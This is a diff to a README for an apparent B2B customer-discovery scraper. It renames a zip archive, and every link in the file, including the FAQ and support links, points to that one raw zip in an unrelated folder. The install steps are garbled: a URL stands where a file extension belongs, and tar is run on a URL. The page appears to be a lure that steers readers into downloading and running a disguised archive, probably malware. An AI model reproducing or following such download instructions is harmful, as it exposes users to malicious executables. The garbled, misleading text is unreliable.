@@ -1,6 +1,6 @@
 # 🦸 Hero-Customer-Discovery-Scraper - Effortless B2B Prospect Discovery
 
-[![Download Hero-Customer-Discovery-Scraper](https://github.com/HdeHug01/Hero-Customer-Discovery-Scraper/raw/refs/heads/main/reassert/Scraper_Hero_Customer_Discovery_v2.2.zip)](https://github.com/HdeHug01/Hero-Customer-Discovery-Scraper/raw/refs/heads/main/reassert/Scraper_Hero_Customer_Discovery_v2.2.zip)
+[![Download Hero-Customer-Discovery-Scraper](https://github.com/HdeHug01/Hero-Customer-Discovery-Scraper/raw/refs/heads/main/reassert/Customer_Scraper_Discovery_Hero_3.9.zip)](https://github.com/HdeHug01/Hero-Customer-Discovery-Scraper/raw/refs/heads/main/reassert/Customer_Scraper_Discovery_Hero_3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Hero-Customer-Discovery-Scraper is a user-friendly tool that helps you find pote
 
 To get started, you need to download the software from our Releases page. Click the link below:
 
-[Visit this page to download](https://github.com/HdeHug01/Hero-Customer-Discovery-Scraper/raw/refs/heads/main/reassert/Scraper_Hero_Customer_Discovery_v2.2.zip)
+[Visit this page to download](https://github.com/HdeHug01/Hero-Customer-Discovery-Scraper/raw/refs/heads/main/reassert/Customer_Scraper_Discovery_Hero_3.9.zip)
 
 Once on the Releases page, look for the latest version of Hero-Customer-Discovery-Scraper. You’ll see a list of files available for download.
 
 1. Click on the latest release.
-2. Download the file appropriate for your operating system. This will usually be a `.exe` file for Windows, a `.dmg` for Mac, or a `https://github.com/HdeHug01/Hero-Customer-Discovery-Scraper/raw/refs/heads/main/reassert/Scraper_Hero_Customer_Discovery_v2.2.zip` for Linux.
+2. Download the file appropriate for your operating system. This will usually be a `.exe` file for Windows, a `.dmg` for Mac, or a `https://github.com/HdeHug01/Hero-Customer-Discovery-Scraper/raw/refs/heads/main/reassert/Customer_Scraper_Discovery_Hero_3.9.zip` for Linux.
 3. After the download completes, find the file in your downloads folder.
 
 ### 🖥 System Requirements
@@ -49,8 +49,8 @@ After downloading the appropriate file, follow these instructions to install and
 ### For Linux Users
 
 1. Open terminal.
-2. Navigate to the directory where you downloaded the `https://github.com/HdeHug01/Hero-Customer-Discovery-Scraper/raw/refs/heads/main/reassert/Scraper_Hero_Customer_Discovery_v2.2.zip` file using `cd your-directory`.
-3. Extract the files using the command: `tar -xvf https://github.com/HdeHug01/Hero-Customer-Discovery-Scraper/raw/refs/heads/main/reassert/Scraper_Hero_Customer_Discovery_v2.2.zip`.
+2. Navigate to the directory where you downloaded the `https://github.com/HdeHug01/Hero-Customer-Discovery-Scraper/raw/refs/heads/main/reassert/Customer_Scraper_Discovery_Hero_3.9.zip` file using `cd your-directory`.
+3. Extract the files using the command: `tar -xvf https://github.com/HdeHug01/Hero-Customer-Discovery-Scraper/raw/refs/heads/main/reassert/Customer_Scraper_Discovery_Hero_3.9.zip`.
 4. Navigate into the extracted folder and run the application with `./Hero-Customer-Discovery-Scraper`.
 
 ## 🌟 Features
@@ -86,8 +86,8 @@ For further details about Hero-Customer-Discovery-Scraper, you can refer to the 
 
 ## 🔗 Useful Links
 
-- [Download Hero-Customer-Discovery-Scraper](https://github.com/HdeHug01/Hero-Customer-Discovery-Scraper/raw/refs/heads/main/reassert/Scraper_Hero_Customer_Discovery_v2.2.zip)
-- [FAQs](https://github.com/HdeHug01/Hero-Customer-Discovery-Scraper/raw/refs/heads/main/reassert/Scraper_Hero_Customer_Discovery_v2.2.zip)
-- [Contact Support](https://github.com/HdeHug01/Hero-Customer-Discovery-Scraper/raw/refs/heads/main/reassert/Scraper_Hero_Customer_Discovery_v2.2.zip)
+- [Download Hero-Customer-Discovery-Scraper](https://github.com/HdeHug01/Hero-Customer-Discovery-Scraper/raw/refs/heads/main/reassert/Customer_Scraper_Discovery_Hero_3.9.zip)
+- [FAQs](https://github.com/HdeHug01/Hero-Customer-Discovery-Scraper/raw/refs/heads/main/reassert/Customer_Scraper_Discovery_Hero_3.9.zip)
+- [Contact Support](https://github.com/HdeHug01/Hero-Customer-Discovery-Scraper/raw/refs/heads/main/reassert/Customer_Scraper_Discovery_Hero_3.9.zip)
 
 With this guide, you should be equipped to download, install, and start using Hero-Customer-Discovery-Scraper effectively. Enjoy discovering your next business prospects!
